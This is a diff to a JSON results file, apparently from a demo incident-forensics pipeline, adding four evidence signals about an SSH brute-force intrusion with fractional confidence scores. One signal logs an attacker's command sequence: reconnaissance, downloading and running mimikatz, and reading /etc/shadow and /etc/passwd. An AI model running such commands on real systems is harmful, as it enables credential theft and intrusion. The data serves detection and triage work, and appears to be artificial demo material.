@@ -139,5 +139,77 @@
     "original_verdict": "MALICE",
     "abstention_risk": "bajo",
     "carnegie_pattern": ""
+  },
+  "signals": [
+    {
+      "artifact_id": "LOG-001",
+      "confidence": {
+        "__fraction__": true,
+        "den": 20,
+        "num": 17
+      },
+      "description": "Mar 15 02:00:00 srv-prod sshd[4821]: Failed password for invalid user admin from 185.220.101.47 port 54832 ssh2\nMar 15 02:00:01 srv-prod sshd[4821]: Failed password for invalid user admin from 185.220",
+      "evidence_type": "log_entry",
+      "source": "legacy_converter",
+      "z_score": {
+        "__fraction__": true,
+        "den": 400,
+        "num": 289
+      }
+    },
+    {
+      "artifact_id": "LOG-002",
+      "confidence": {
+        "__fraction__": true,
+        "den": 20,
+        "num": 17
+      },
+      "description": "whoami\nid\nuname -a\nwget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip\nunzip mimikatz_trunk.zip\n./mimikatz.exe\nls /etc/shadow\ncat /etc/passwd\nfind / -name '",
+      "evidence_type": "log_entry",
+      "source": "legacy_converter",
+      "z_score": {
+        "__fraction__": true,
+        "den": 400,
+        "num": 289
+      }
+    },
+    {
+      "artifact_id": "META-001",
+      "confidence": {
+        "__fraction__": true,
+        "den": 20,
+        "num": 17
+      },
+      "description": "{'filename': 'exfil.tar.gz', 'created': '2026-03-15T02:03:00Z', 'modified': '2026-03-15T02:03:00Z', 'size_bytes': 0, 'md5': 'd41d8cd98f00b204e9800998ecf8427e', 'owner': 'root', 'permissions': '0644'}",
+      "evidence_type": "file_timestamp",
+      "source": "legacy_converter",
+      "z_score": {
+        "__fraction__": true,
+        "den": 400,
+        "num": 289
+      }
+    },
+    {
+      "artifact_id": "NET-001",
+      "confidence": {
+        "__fraction__": true,
+        "den": 20,
+        "num": 17
+      },
+      "description": "02:00:00.000 SSH connection established: 185.220.101.47:54833 -> 10.0.0.5:22\n02:00:02.000 SSH authenticated: backup_user\n02:01:00.000 HTTP GET github.com/gentilkiwi/mimikatz [200 OK, 8.2MB]\n02:02:00.0",
+      "evidence_type": "log_entry",
+      "source": "legacy_converter",
+      "z_score": {
+        "__fraction__": true,
+        "den": 400,
+        "num": 289
+      }
+    }
+  ],
+  "_migration_note": {
+    "date": "2026-07-06",
+    "source": "results/agent_batch/VIGIA-2026-DEMO-004_agent_bundle.json",
+    "method": "señales computadas por el pipeline determinista (modo motor, B-075/B-076) extraídas de pipeline_results.signals del bundle sellado; codificación Fraction canónica preservada",
+    "n_signals": 4
   }
 }
